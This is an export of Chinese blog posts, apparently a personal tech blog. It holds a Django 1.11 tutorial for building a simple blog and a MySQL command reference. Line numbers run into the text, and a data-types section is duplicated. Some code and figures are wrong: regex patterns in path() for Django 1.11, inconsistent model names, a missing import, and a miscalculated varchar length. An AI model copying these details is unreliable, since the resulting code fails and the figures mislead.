Django对Python版本的依赖关系如下表所示Django本身的版本支持路线图如下所示 下载安装django首先下载django框架，适用pip包管理工具进行下载，并指定版本号为1.11，因为这个版本号是LTS的，可以得到很长时间的技术支持，而且该版本存在大量的学习文档，方便学习与使用。1lengyue@ubuntu:~$ sudo -H pip install django==1.11 我们从图中可以看到已经成功安装，我们还可以通过以下2个命令来进行查看是否成功安装。1234lengyue@ubuntu:~$ python -m django --versionlengyue@ubuntu:~$ python&gt;&gt;&gt; import django&gt;&gt;&gt; print(django.get_version()) 创建myblog项目12lengyue@ubuntu:~$ django-admin startproject mybloglengyue@ubuntu:~$ ls 下面切换到myblog目录，并创建blog应用。12345lengyue@ubuntu:~$ cd myblog/lengyue@ubuntu:~/myblog$ lsmanage.py mybloglengyue@ubuntu:~/myblog$ sudo python manange.py startapp bloglengyue@ubuntu:~/myblog$ ls 项目结构说明然后我们来看一下项目目录结构图1lengyue@ubuntu:~$ tree myblog 以下是项目的目录介绍,如果你想学习django的话，那么下面每个文件的作用都要十分的清晰。目录介绍：1234567891011121314151617181920manage.py ： Django项目里面的工具，通过它可以调用django shell和数据库等。myblog/| --- settings.py ： 包含了项目的默认设置，包括数据库信息，调试标志以及其他一些工作的变量。| --- urls.py ： 负责把URL模式映射到应用程序。| --- wsgi.py : 用于项目部署。blog /| --- admin.py : django 自带admin后面管理，将models.py 中表映射到后台。| --- apps.py : blog 应用的相关配置。| --- models.py : Django 自带的ORM，用于设计数据库表。| --- tests.py : 用于编写Django单元测试。| --- veiws.py ：视图文件，用于编写功能的主要处理逻辑。 我们到 myblog/myblog/目录下，找到settings.py文件，这是django的主要配置文件。123lengyue@ubuntu:~/myblog$ cd myblog/lengyue@ubuntu:~/myblog/myblog$ ls__init__.py __init__.pyc settings.py settings.pyc urls.py wsgi.py 打开settings.py配置文件，添加blog应用。1lengyue@ubuntu:~/myblog/myblog$ sudo gedit settings.py 初始化数据库然后我们需要初始化数据库，记得一定要初始化数据库。Python 自带SQLite3数据库，Django同意也是默认使用SQLite3数据库，如果你使用其它数据库可以在settings.py文件中进行设置。此时回退到myblog目录,然后我们需要执行数据库同步，把相关表生成出来。12lengyue@ubuntu:~/myblog/myblog$ cd ..lengyue@ubuntu:~/myblog$ sudo python manage.py migrate 然后我们需要为自己的博客创建一个后台账户，以方便以后的管理，键入你创建的账户名称和密码。(一定要记住你的登陆密码)1lengyue@ubuntu:~/myblog$ sudo python manage.py createsuperuser 启动应用&amp;访问admin后台1lengyue@ubuntu:~/myblog$ sudo python manage.py runserver 现在打开浏览器，地址栏输入 http://127.0.0.1:8000现在访问一下后台: http://127.0.0.1:8000/admin ,输入刚才创建的账户即可登陆进去。OK,一切成功，你已经做成功了最重要的步骤。下一步就是开始配置自己的博客了。我们可以看到默认的网站是英文的，而且时间也是错乱，和本机时间对不上的。其实django默认的时区是America/Chicago。现在我们开始通过配置文件来修改这些信息。12lengyue@ubuntu:~/myblog$ cd mybloglengyue@ubuntu:~/myblog/myblog$ sudo gedit settings.py 把其中的相关配置设置为如下所示。123LANGUAGE_CODE = &apos;zh-hans&apos;TIME_ZONE = &apos;Asia/Shanghai&apos;USE_TZ = False 保存退出后，我们现在刷新一下界面，OK！ 创建Model(即设计数据库表)创建blog表。12lengyue@ubuntu:~/myblog$ cd bloglengyue@ubuntu:~/myblog/blog$ sudo gedit models.py 打开后，将如下内容复制进去。1234class BlogsPost(models.Model): title = models.CharField(max_length = 150) # 博客标题 body = models.TextField() # 博客正文 timestamp = models.DateTimeField() # 创建时间 在该app下建立migrations目录，该目录包含了我们创建的模型，并且指出这个类的成员属性id,name,以及他们的属性。1lengyue@ubuntu:~/myblog$ sudo python manage.py makemigrations blog 执行数据库同步，将该改动作用到数据库文件，使模型类对应的数据表。1lengyue@ubuntu:~/myblog$ sudo python manage.py migrate 创建模板在blog项目下创建templates目录（myblog/blog/templates/）。(注意： 文件名一定需要是templates，其他任何名字都会报错),不然会出现如下所示错误。并在templates目录下创建模板文件。1234lengyue@ubuntu:~/myblog$ cd bloglengyue@ubuntu:~/myblog/blog$ sudo mkdir templateslengyue@ubuntu:~/myblog/blog$ cd templateslengyue@ubuntu:~/myblog/blog/templates$ sudo touch index.html 将以下内容复制粘贴进去。12345&#123;% for blog in blog_list %&#125; &lt;h2&gt;&#123;&#123; blog.title &#125;&#125;&lt;/h2&gt; &lt;p&gt;&#123;&#123; blog.timestamp &#125;&#125;&lt;/p&gt; &lt;p&gt;&#123;&#123; blog.body &#125;&#125;&lt;/p&gt;&#123;% endfor %&#125; 创建视图函数打开myblog/blog/views.py文件，向其中添加如下内容：12345from blog.models import BlogsPostdef blog_index(request): blog_list = BlogsPost.objects.all() # 获取所有数据 return render(request,&apos;index.html&apos;, &#123;&apos;blog_list&apos;:blog_list&#125;) # 返回index.html页面 blog_list = BlogPost.objects.all() ：获取数据库里面所拥有BlogPost对象。render返回一个页面(index.html)，顺带把数据库中查询出来的所有博客内容（blog_list）也一并返回。 创建blog的URL模式我们需要blog可以索引到我们的发布的文章。在myblog/urls.py文件里添加blog的url，将下面内容复制粘贴进文件的对应地方，注意缩进。123456from blog import viewsurlpatterns = [ path(r&apos;^admin/&apos;, admin.site.urls), path(r&apos;^blog/&apos;, views.blog_index),] 刷新网页，访问blog应用（http://127.0.0.1:8000/blog/）。好了，现在我们已经做出一个最基本的博客了，虽然整体界面实在太简洁了，好像除了文字没有任何东西了，但是你已经做出了一个blog最基础的模样了。我们可以发布一篇文章来试试看是否已经成功创建出一个博客框架了。点击’Blogs posts’中的’增加’按钮，向其中任意写入内容。然后点击’保存’.我们即可看到如下界面。然后我们去博客主页看是否已经成功发布到主页。地址：http://127.0.0.1:8000/blog/接下来，我们应该做的就是对自己的blog进行美化了。当然美化也是需要更为系统的知识的。你需要了解django的样式结构，了解HTML,CSS,JavaSprite,BootStrap等前端知识。本文参考《Django web开发指南》，如果你需要本书，可以扫描下方二维码进群获取。]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mysql基础命令汇总]]></title>
    <url>%2F2018%2F08%2F10%2Fmysql%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E6%B1%87%E6%80%BB%2F</url>
    <content type="text"><![CDATA[Windows服务123456789101112-- 启动MySQL net start mysql-- 创建Windows服务 sc create mysql binPath= mysqld_bin_path(注意：等号与值之间有空格)``` ### 连接与断开服务器``` sqlmysql -h 地址 -P 端口 -u 用户名 -p 密码SHOW PROCESSLIST -- 显示哪些线程正在运行SHOW VARIABLES -- 显示系统变量信息 数据库操作123456789101112131415161718-- 查看当前数据库 SELECT DATABASE();-- 显示当前时间、用户名、数据库版本 SELECT now(), user(), version();-- 创建库 CREATE DATABASE[ IF NOT EXISTS] 数据库名 数据库选项 数据库选项： CHARACTER SET charset_name COLLATE collation_name-- 查看已有库 SHOW DATABASES[ LIKE 'PATTERN']-- 查看当前库信息 SHOW CREATE DATABASE 数据库名-- 修改库的选项信息 ALTER DATABASE 库名 选项信息-- 删除库 DROP DATABASE[ IF EXISTS] 数据库名 同时删除该数据库相关的目录及其目录内容 表的操作12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576-- 创建表 CREATE [TEMPORARY] TABLE[ IF NOT EXISTS] [库名.]表名 ( 表的结构定义 )[ 表选项] 每个字段必须有数据类型 最后一个字段后不能有逗号 TEMPORARY 临时表，会话结束时表自动消失 对于字段的定义： 字段名 数据类型 [NOT NULL | NULL] [DEFAULT default_value] [AUTO_INCREMENT] [UNIQUE [KEY] | [PRIMARY] KEY] [COMMENT 'string']-- 表选项 -- 字符集 CHARSET = charset_name 如果表没有设定，则使用数据库字符集 -- 存储引擎 ENGINE = engine_name 表在管理数据时采用的不同的数据结构，结构不同会导致处理方式、提供的特性操作等不同 常见的引擎：InnoDB MyISAM Memory/Heap BDB Merge Example CSV MaxDB Archive 不同的引擎在保存表的结构和数据时采用不同的方式 MyISAM表文件含义：.frm表定义，.MYD表数据，.MYI表索引 InnoDB表文件含义：.frm表定义，表空间数据和日志文件 SHOW ENGINES -- 显示存储引擎的状态信息 SHOW ENGINE 引擎名 &#123;LOGS|STATUS&#125; -- 显示存储引擎的日志或状态信息 -- 自增起始数 AUTO_INCREMENT = 行数 -- 数据文件目录 DATA DIRECTORY = '目录' -- 索引文件目录 INDEX DIRECTORY = '目录' -- 表注释 COMMENT = 'string' -- 分区选项 PARTITION BY ... (详细见手册)-- 查看所有表 SHOW TABLES[ LIKE 'pattern'] SHOW TABLES FROM 表名-- 查看表机构 SHOW CREATE TABLE 表名 （信息更详细） DESC 表名 / DESCRIBE 表名 / EXPLAIN 表名 / SHOW COLUMNS FROM 表名 [LIKE 'PATTERN'] SHOW TABLE STATUS [FROM db_name] [LIKE 'pattern']-- 修改表 -- 修改表本身的选项 ALTER TABLE 表名 表的选项 eg: ALTER TABLE 表名 ENGINE=MYISAM; -- 对表进行重命名 RENAME TABLE 原表名 TO 新表名 RENAME TABLE 原表名 TO 库名.表名 （可将表移动到另一个数据库） -- RENAME可以交换两个表名 -- 修改表的字段机构（13.1.2. ALTER TABLE语法） ALTER TABLE 表名 操作名 -- 操作名 ADD[ COLUMN] 字段定义 -- 增加字段 AFTER 字段名 -- 表示增加在该字段名后面 FIRST -- 表示增加在第一个 ADD PRIMARY KEY(字段名) -- 创建主键 ADD UNIQUE [索引名] (字段名)-- 创建唯一索引 ADD INDEX [索引名] (字段名) -- 创建普通索引 DROP[ COLUMN] 字段名 -- 删除字段 MODIFY[ COLUMN] 字段名 字段属性 -- 支持对字段属性进行修改，不能修改字段名(所有原有属性也需写上) CHANGE[ COLUMN] 原字段名 新字段名 字段属性 -- 支持对字段名修改 DROP PRIMARY KEY -- 删除主键(删除主键前需删除其AUTO_INCREMENT属性) DROP INDEX 索引名 -- 删除索引 DROP FOREIGN KEY 外键 -- 删除外键-- 删除表 DROP TABLE[ IF EXISTS] 表名 ...-- 清空表数据 TRUNCATE [TABLE] 表名-- 复制表结构 CREATE TABLE 表名 LIKE 要复制的表名-- 复制表结构和数据 CREATE TABLE 表名 [AS] SELECT * FROM 要复制的表名-- 检查表是否有错误 CHECK TABLE tbl_name [, tbl_name] ... [option] ...-- 优化表 OPTIMIZE [LOCAL | NO_WRITE_TO_BINLOG] TABLE tbl_name [, tbl_name] ...-- 修复表 REPAIR [LOCAL | NO_WRITE_TO_BINLOG] TABLE tbl_name [, tbl_name] ... [QUICK] [EXTENDED] [USE_FRM]-- 分析表 ANALYZE [LOCAL | NO_WRITE_TO_BINLOG] TABLE tbl_name [, tbl_name] ... 数据库操作12345678910111213141516-- 增 INSERT [INTO] 表名 [(字段列表)] VALUES (值列表)[, (值列表), ...] -- 如果要插入的值列表包含所有字段并且顺序一致，则可以省略字段列表。 -- 可同时插入多条数据记录！ REPLACE 与 INSERT 完全一样，可互换。 INSERT [INTO] 表名 SET 字段名=值[, 字段名=值, ...]-- 查 SELECT 字段列表 FROM 表名[ 其他子句] -- 可来自多个表的多个字段 -- 其他子句可以不使用 -- 字段列表可以用*代替，表示所有字段-- 删 DELETE FROM 表名[ 删除条件子句] 没有条件子句，则会删除全部-- 改 UPDATE 表名 SET 字段名=新值[, 字段名=新值] [更新条件] 字符集编码1234567891011121314151617-- MySQL、数据库、表、字段均可设置编码-- 数据编码与客户端编码不需一致SHOW VARIABLES LIKE 'character_set_%' -- 查看所有字符集编码项 character_set_client 客户端向服务器发送数据时使用的编码 character_set_results 服务器端将结果返回给客户端所使用的编码 character_set_connection 连接层编码SET 变量名 = 变量值 SET character_set_client = gbk; SET character_set_results = gbk; SET character_set_connection = gbk;SET NAMES GBK; -- 相当于完成以上三个设置-- 校对集 校对集用以排序 SHOW CHARACTER SET [LIKE 'pattern']/SHOW CHARSET [LIKE 'pattern'] 查看所有字符集 SHOW COLLATION [LIKE 'pattern'] 查看所有校对集 CHARSET 字符集编码 设置字符集编码 COLLATE 校对集编码 设置校对集编码 数据类型(列类型)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081. 数值类型-- a. 整型 ---------- 类型 字节 范围（有符号位） tinyint 1字节 -128 ~ 127 无符号位：0 ~ 255 smallint 2字节 -32768 ~ 32767 mediumint 3字节 -8388608 ~ 8388607 int 4字节 bigint 8字节 int(M) M表示总位数 - 默认存在符号位，unsigned 属性修改 - 显示宽度，如果某个数不够定义字段时设置的位数，则前面以0补填，zerofill 属性修改 例：int(5) 插入一个数&apos;123&apos;，补填后为&apos;00123&apos; - 在满足要求的情况下，越小越好。 - 1表示bool值真，0表示bool值假。MySQL没有布尔类型，通过整型0和1表示。常用tinyint(1)表示布尔型。-- b. 浮点型 ---------- 类型 字节 范围 float(单精度) 4字节 double(双精度) 8字节 浮点型既支持符号位 unsigned 属性，也支持显示宽度 zerofill 属性。 不同于整型，前后均会补填0. 定义浮点型时，需指定总位数和小数位数。 float(M, D) double(M, D) M表示总位数，D表示小数位数。 M和D的大小会决定浮点数的范围。不同于整型的固定范围。 M既表示总位数（不包括小数点和正负号），也表示显示宽度（所有显示符号均包括）。 支持科学计数法表示。 浮点数表示近似值。-- c. 定点数 ---------- decimal -- 可变长度 decimal(M, D) M也表示总位数，D表示小数位数。 保存一个精确的数值，不会发生数据的改变，不同于浮点数的四舍五入。 将浮点数转换为字符串来保存，每9位数字保存为4个字节。2. 字符串类型-- a. char, varchar ---------- char 定长字符串，速度快，但浪费空间 varchar 变长字符串，速度慢，但节省空间 M表示能存储的最大长度，此长度是字符数，非字节数。 不同的编码，所占用的空间不同。 char,最多255个字符，与编码无关。 varchar,最多65535字符，与编码有关。 一条有效记录最大不能超过65535个字节。 utf8 最大为21844个字符，gbk 最大为32766个字符，latin1 最大为65532个字符 varchar 是变长的，需要利用存储空间保存 varchar 的长度，如果数据小于255个字节，则采用一个字节来保存长度，反之需要两个字节来保存。 varchar 的最大有效长度由最大行大小和使用的字符集确定。 最大有效长度是65532字节，因为在varchar存字符串时，第一个字节是空的，不存在任何数据，然后还需两个字节来存放字符串的长度，所以有效长度是64432-1-2=65532字节。 例：若一个表定义为 CREATE TABLE tb(c1 int, c2 char(30), c3 varchar(N)) charset=utf8; 问N的最大值是多少？ 答：(65535-1-2-4-30*3)/3-- b. blob, text ---------- blob 二进制字符串（字节字符串） tinyblob, blob, mediumblob, longblob text 非二进制字符串（字符字符串） tinytext, text, mediumtext, longtext text 在定义时，不需要定义长度，也不会计算总长度。 text 类型在定义时，不可给default值-- c. binary, varbinary ---------- 类似于char和varchar，用于保存二进制字符串，也就是保存字节字符串而非字符字符串。 char, varchar, text 对应 binary, varbinary, blob.3. 日期时间类型 一般用整型保存时间戳，因为PHP可以很方便的将时间戳进行格式化。 datetime 8字节 日期及时间 1000-01-01 00:00:00 到 9999-12-31 23:59:59 date 3字节 日期 1000-01-01 到 9999-12-31 timestamp 4字节 时间戳 19700101000000 到 2038-01-19 03:14:07 time 3字节 时间 -838:59:59 到 838:59:59 year 1字节 年份 1901 - 2155datetime YYYY-MM-DD hh:mm:sstimestamp YY-MM-DD hh:mm:ss YYYYMMDDhhmmss YYMMDDhhmmss YYYYMMDDhhmmss YYMMDDhhmmssdate YYYY-MM-DD YY-MM-DD YYYYMMDD YYMMDD YYYYMMDD YYMMDDtime hh:mm:ss hhmmss hhmmssyear YYYY YY YYYY YY4. 枚举和集合-- 枚举(enum) ----------enum(val1, val2, val3...) 在已知的值中进行单选。最大数量为65535. 枚举值在保存时，以2个字节的整型(smallint)保存。每个枚举值，按保存的位置顺序，从1开始逐一递增。 表现为字符串类型，存储却是整型。 NULL值的索引是NULL。 空字符串错误值的索引值是0。-- 集合（set） ----------set(val1, val2, val3...) create table tab ( gender set(&apos;男&apos;, &apos;女&apos;, &apos;无&apos;) ); insert into tab values (&apos;男, 女&apos;); 最多可以有64个不同的成员。以bigint存储，共8个字节。采取位运算的形式。 当创建表时，SET成员值的尾部空格将自动被删除。 选择类型1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081. 数值类型-- a. 整型 ---------- 类型 字节 范围（有符号位） tinyint 1字节 -128 ~ 127 无符号位：0 ~ 255 smallint 2字节 -32768 ~ 32767 mediumint 3字节 -8388608 ~ 8388607 int 4字节 bigint 8字节 int(M) M表示总位数 - 默认存在符号位，unsigned 属性修改 - 显示宽度，如果某个数不够定义字段时设置的位数，则前面以0补填，zerofill 属性修改 例：int(5) 插入一个数'123'，补填后为'00123' - 在满足要求的情况下，越小越好。 - 1表示bool值真，0表示bool值假。MySQL没有布尔类型，通过整型0和1表示。常用tinyint(1)表示布尔型。-- b. 浮点型 ---------- 类型 字节 范围 float(单精度) 4字节 double(双精度) 8字节 浮点型既支持符号位 unsigned 属性，也支持显示宽度 zerofill 属性。 不同于整型，前后均会补填0. 定义浮点型时，需指定总位数和小数位数。 float(M, D) double(M, D) M表示总位数，D表示小数位数。 M和D的大小会决定浮点数的范围。不同于整型的固定范围。 M既表示总位数（不包括小数点和正负号），也表示显示宽度（所有显示符号均包括）。 支持科学计数法表示。 浮点数表示近似值。-- c. 定点数 ---------- decimal -- 可变长度 decimal(M, D) M也表示总位数，D表示小数位数。 保存一个精确的数值，不会发生数据的改变，不同于浮点数的四舍五入。 将浮点数转换为字符串来保存，每9位数字保存为4个字节。2. 字符串类型-- a. char, varchar ---------- char 定长字符串，速度快，但浪费空间 varchar 变长字符串，速度慢，但节省空间 M表示能存储的最大长度，此长度是字符数，非字节数。 不同的编码，所占用的空间不同。 char,最多255个字符，与编码无关。 varchar,最多65535字符，与编码有关。 一条有效记录最大不能超过65535个字节。 utf8 最大为21844个字符，gbk 最大为32766个字符，latin1 最大为65532个字符 varchar 是变长的，需要利用存储空间保存 varchar 的长度，如果数据小于255个字节，则采用一个字节来保存长度，反之需要两个字节来保存。 varchar 的最大有效长度由最大行大小和使用的字符集确定。 最大有效长度是65532字节，因为在varchar存字符串时，第一个字节是空的，不存在任何数据，然后还需两个字节来存放字符串的长度，所以有效长度是64432-1-2=65532字节。 例：若一个表定义为 CREATE TABLE tb(c1 int, c2 char(30), c3 varchar(N)) charset=utf8; 问N的最大值是多少？ 答：(65535-1-2-4-30*3)/3-- b. blob, text ---------- blob 二进制字符串（字节字符串） tinyblob, blob, mediumblob, longblob text 非二进制字符串（字符字符串） tinytext, text, mediumtext, longtext text 在定义时，不需要定义长度，也不会计算总长度。 text 类型在定义时，不可给default值-- c. binary, varbinary ---------- 类似于char和varchar，用于保存二进制字符串，也就是保存字节字符串而非字符字符串。 char, varchar, text 对应 binary, varbinary, blob.3. 日期时间类型 一般用整型保存时间戳，因为PHP可以很方便的将时间戳进行格式化。 datetime 8字节 日期及时间 1000-01-01 00:00:00 到 9999-12-31 23:59:59 date 3字节 日期 1000-01-01 到 9999-12-31 timestamp 4字节 时间戳 19700101000000 到 2038-01-19 03:14:07 time 3字节 时间 -838:59:59 到 838:59:59 year 1字节 年份 1901 - 2155datetime YYYY-MM-DD hh:mm:sstimestamp YY-MM-DD hh:mm:ss YYYYMMDDhhmmss YYMMDDhhmmss YYYYMMDDhhmmss YYMMDDhhmmssdate YYYY-MM-DD YY-MM-DD YYYYMMDD YYMMDD YYYYMMDD YYMMDDtime hh:mm:ss hhmmss hhmmssyear YYYY YY YYYY YY4. 枚举和集合-- 枚举(enum) ----------enum(val1, val2, val3...) 在已知的值中进行单选。最大数量为65535. 枚举值在保存时，以2个字节的整型(smallint)保存。每个枚举值，按保存的位置顺序，从1开始逐一递增。 表现为字符串类型，存储却是整型。 NULL值的索引是NULL。 空字符串错误值的索引值是0。-- 集合（set） ----------set(val1, val2, val3...) create table tab ( gender set('男', '女', '无') ); insert into tab values ('男, 女'); 最多可以有64个不同的成员。以bigint存储，共8个字节。采取位运算的形式。 当创建表时，SET成员值的尾部空格将自动被删除。 列属性(列约束)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647481. PRIMARY 主键 - 能唯一标识记录的字段，可以作为主键。 - 一个表只能有一个主键。 - 主键具有唯一性。 - 声明字段时，用 primary key 标识。 也可以在字段列表之后声明 例：create table tab ( id int, stu varchar(10), primary key (id)); - 主键字段的值不能为null。 - 主键可以由多个字段共同组成。此时需要在字段列表后声明的方法。 例：create table tab ( id int, stu varchar(10), age int, primary key (stu, age));2. UNIQUE 唯一索引（唯一约束） 使得某字段的值也不能重复。3. NULL 约束 null不是数据类型，是列的一个属性。 表示当前列是否可以为null，表示什么都没有。 null, 允许为空。默认。 not null, 不允许为空。 insert into tab values (null, 'val'); -- 此时表示将第一个字段的值设为null, 取决于该字段是否允许为null4. DEFAULT 默认值属性 当前字段的默认值。 insert into tab values (default, 'val'); -- 此时表示强制使用默认值。 create table tab ( add_time timestamp default current_timestamp ); -- 表示将当前时间的时间戳设为默认值。 current_date, current_time5. AUTO_INCREMENT 自动增长约束 自动增长必须为索引（主键或unique） 只能存在一个字段为自动增长。 默认为1开始自动增长。可以通过表属性 auto_increment = x进行设置，或 alter table tbl auto_increment = x;6. COMMENT 注释 例：create table tab ( id int ) comment '注释内容';7. FOREIGN KEY 外键约束 用于限制主表与从表数据完整性。 alter table t1 add constraint `t1_t2_fk` foreign key (t1_id) references t2(id); -- 将表t1的t1_id外键关联到表t2的id字段。 -- 每个外键都有一个名字，可以通过 constraint 指定 存在外键的表，称之为从表（子表），外键指向的表，称之为主表（父表）。 作用：保持数据一致性，完整性，主要目的是控制存储在外键表（从表）中的数据。 MySQL中，可以对InnoDB引擎使用外键约束： 语法： foreign key (外键字段） references 主表名 (关联字段) [主表记录删除时的动作] [主表记录更新时的动作] 此时需要检测一个从表的外键需要约束为主表的已存在的值。外键在没有关联的情况下，可以设置为null.前提是该外键列，没有not null。 可以不指定主表记录更改或更新时的动作，那么此时主表的操作被拒绝。 如果指定了 on update 或 on delete：在删除或更新时，有如下几个操作可以选择： 1. cascade，级联操作。主表数据被更新（主键值更新），从表也被更新（外键值更新）。主表记录被删除，从表相关记录也被删除。 2. set null，设置为null。主表数据被更新（主键值更新），从表的外键被设置为null。主表记录被删除，从表相关记录外键被设置成null。但注意，要求该外键列，没有not null属性约束。 3. restrict，拒绝父表删除和更新。 注意，外键只被InnoDB存储引擎所支持。其他引擎是不支持的。 建表规范12345678910111213-- Normal Format, NF - 每个表保存一个实体信息 - 每个具有一个ID字段作为主键 - ID主键 + 原子表 -- 1NF, 第一范式 字段不能再分，就满足第一范式。 -- 2NF, 第二范式 满足第一范式的前提下，不能出现部分依赖。 消除符合主键就可以避免部分依赖。增加单列关键字。 -- 3NF, 第三范式 满足第二范式的前提下，不能出现传递依赖。 某个字段依赖于主键，而有其他字段依赖于该字段。这就是传递依赖。 将一个实体信息的数据放在一个表内实现。 SELECT1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859SELECT [ALL|DISTINCT] select_expr FROM -&gt; WHERE -&gt; GROUP BY [合计函数] -&gt; HAVING -&gt; ORDER BY -&gt; LIMITa. select_expr -- 可以用 * 表示所有字段。 select * from tb; -- 可以使用表达式（计算公式、函数调用、字段也是个表达式） select stu, 29+25, now() from tb; -- 可以为每个列使用别名。适用于简化列标识，避免多个列标识符重复。 - 使用 as 关键字，也可省略 as. select stu+10 as add10 from tb;b. FROM 子句 用于标识查询来源。 -- 可以为表起别名。使用as关键字。 SELECT * FROM tb1 AS tt, tb2 AS bb; -- from子句后，可以同时出现多个表。 -- 多个表会横向叠加到一起，而数据会形成一个笛卡尔积。 SELECT * FROM tb1, tb2; -- 向优化符提示如何选择索引 USE INDEX、IGNORE INDEX、FORCE INDEX SELECT * FROM table1 USE INDEX (key1,key2) WHERE key1=1 AND key2=2 AND key3=3; SELECT * FROM table1 IGNORE INDEX (key3) WHERE key1=1 AND key2=2 AND key3=3;c. WHERE 子句 -- 从from获得的数据源中进行筛选。 -- 整型1表示真，0表示假。 -- 表达式由运算符和运算数组成。 -- 运算数：变量（字段）、值、函数返回值 -- 运算符： =, &lt;=&gt;, &lt;&gt;, !=, &lt;=, &lt;, &gt;=, &gt;, !, &amp;&amp;, ||, in (not) null, (not) like, (not) in, (not) between and, is (not), and, or, not, xor is/is not 加上ture/false/unknown，检验某个值的真假 &lt;=&gt;与&lt;&gt;功能相同，&lt;=&gt;可用于null比较d. GROUP BY 子句, 分组子句 GROUP BY 字段/别名 [排序方式] 分组后会进行排序。升序：ASC，降序：DESC 以下[合计函数]需配合 GROUP BY 使用： count 返回不同的非NULL值数目 count(*)、count(字段) sum 求和 max 求最大值 min 求最小值 avg 求平均值 group_concat 返回带有来自一个组的连接的非NULL值的字符串结果。组内字符串连接。e. HAVING 子句，条件子句 与 where 功能、用法相同，执行时机不同。 where 在开始时执行检测数据，对原数据进行过滤。 having 对筛选出的结果再次进行过滤。 having 字段必须是查询出来的，where 字段必须是数据表存在的。 where 不可以使用字段的别名，having 可以。因为执行WHERE代码时，可能尚未确定列值。 where 不可以使用合计函数。一般需用合计函数才会用 having SQL标准要求HAVING必须引用GROUP BY子句中的列或用于合计函数中的列。f. ORDER BY 子句，排序子句 order by 排序字段/别名 排序方式 [,排序字段/别名 排序方式]... 升序：ASC，降序：DESC 支持多个字段的排序。g. LIMIT 子句，限制结果数量子句 仅对处理好的结果进行数量限制。将处理好的结果的看作是一个集合，按照记录出现的顺序，索引从0开始。 limit 起始位置, 获取条数 省略第一个参数，表示从索引0开始。limit 获取条数h. DISTINCT, ALL 选项 distinct 去除重复记录 默认为 all, 全部记录 UNION1234567将多个select查询的结果组合成一个结果集合。 SELECT ... UNION [ALL|DISTINCT] SELECT ... 默认 DISTINCT 方式，即所有返回的行都是唯一的 建议，对每个SELECT查询加上小括号包裹。 ORDER BY 排序时，需加上 LIMIT 进行结合。 需要各select查询的字段数量一样。 每个select查询的字段列表(数量、类型)应一致，因为结果中的字段名以第一条select语句为准。 子查询12345678910111213141516171819202122232425262728- 子查询需用括号包裹。-- from型 from后要求是一个表，必须给子查询结果取个别名。 - 简化每个查询内的条件。 - from型需将结果生成一个临时表格，可用以原表的锁定的释放。 - 子查询返回一个表，表型子查询。 select * from (select * from tb where id&gt;0) as subfrom where id&gt;1;-- where型 - 子查询返回一个值，标量子查询。 - 不需要给子查询取别名。 - where子查询内的表，不能直接用以更新。 select * from tb where money = (select max(money) from tb); -- 列子查询 如果子查询结果返回的是一列。 使用 in 或 not in 完成查询 exists 和 not exists 条件 如果子查询返回数据，则返回1或0。常用于判断条件。 select column1 from t1 where exists (select * from t2); -- 行子查询 查询条件是一个行。 select * from t1 where (id, gender) in (select id, gender from t2); 行构造符：(col1, col2, ...) 或 ROW(col1, col2, ...) 行构造符通常用于与对能返回两个或两个以上列的子查询进行比较。 -- 特殊运算符 != all() 相当于 not in = some() 相当于 in。any 是 some 的别名 != some() 不等同于 not in，不等于其中某一个。 all, some 可以配合其他运算符一起使用。 连接查询(join)123456789101112131415161718192021222324将多个表的字段进行连接，可以指定连接条件。-- 内连接(inner join) - 默认就是内连接，可省略inner。 - 只有数据存在时才能发送连接。即连接结果不能出现空行。 on 表示连接条件。其条件表达式与where类似。也可以省略条件（表示条件永远为真） 也可用where表示连接条件。 还有 using, 但需字段名相同。 using(字段名) -- 交叉连接 cross join 即，没有条件的内连接。 select * from tb1 cross join tb2;-- 外连接(outer join) - 如果数据不存在，也会出现在连接结果中。 -- 左外连接 left join 如果数据不存在，左表记录会出现，而右表为null填充 -- 右外连接 right join 如果数据不存在，右表记录会出现，而左表为null填充-- 自然连接(natural join) 自动判断连接条件完成连接。 相当于省略了using，会自动查找相同字段名。 natural join natural left join natural right joinselect info.id, info.name, info.stu_num, extra_info.hobby, extra_info.sex from info, extra_info where info.stu_num = extra_info.stu_id; 导出1234567891011121314151617181920select * into outfile 文件地址 [控制格式] from 表名; -- 导出表数据load data [local] infile 文件地址 [replace|ignore] into table 表名 [控制格式]; -- 导入数据 生成的数据默认的分隔符是制表符 local未指定，则数据文件必须在服务器上 replace 和 ignore 关键词控制对现有的唯一键记录的重复的处理-- 控制格式fields 控制字段格式默认：fields terminated by '\t' enclosed by '' escaped by '\\' terminated by 'string' -- 终止 enclosed by 'char' -- 包裹 escaped by 'char' -- 转义 -- 示例： SELECT a,b,a+b INTO OUTFILE '/tmp/result.text' FIELDS TERMINATED BY ',' OPTIONALLY ENCLOSED BY '"' LINES TERMINATED BY '\n' FROM test_table;lines 控制行格式默认：lines terminated by '\n' terminated by 'string' -- 终止 INSERT1234567891011121314select语句获得的数据可以用insert插入。可以省略对列的指定，要求 values () 括号内，提供给了按照列顺序出现的所有字段的值。 或者使用set语法。 INSERT INTO tbl_name SET field=value,...；可以一次性使用多个值，采用(), (), ();的形式。 INSERT INTO tbl_name VALUES (), (), ();可以在列值指定时，使用表达式。 INSERT INTO tbl_name VALUES (field_value, 10+10, now());可以使用一个特殊值 DEFAULT，表示该列使用默认值。 INSERT INTO tbl_name VALUES (field_value, DEFAULT);可以通过一个查询的结果，作为需要插入的值。 INSERT INTO tbl_name SELECT ...;可以指定在插入的值出现主键（或唯一索引）冲突时，更新其他非主键列的信息。 INSERT INTO tbl_name VALUES/SET/SELECT ON DUPLICATE KEY UPDATE 字段=值, …; DELETE123456DELETE FROM tbl_name [WHERE where_definition] [ORDER BY ...] [LIMIT row_count]按照条件删除。where指定删除的最多记录数。limit可以通过排序条件删除。order by + limit支持多表删除，使用类似连接语法。delete from 需要删除数据多表1，表2 using 表连接操作 条件。 TRUNCATE12345678TRUNCATE [TABLE] tbl_name清空数据删除重建表区别：1，truncate 是删除表再创建，delete 是逐条删除2，truncate 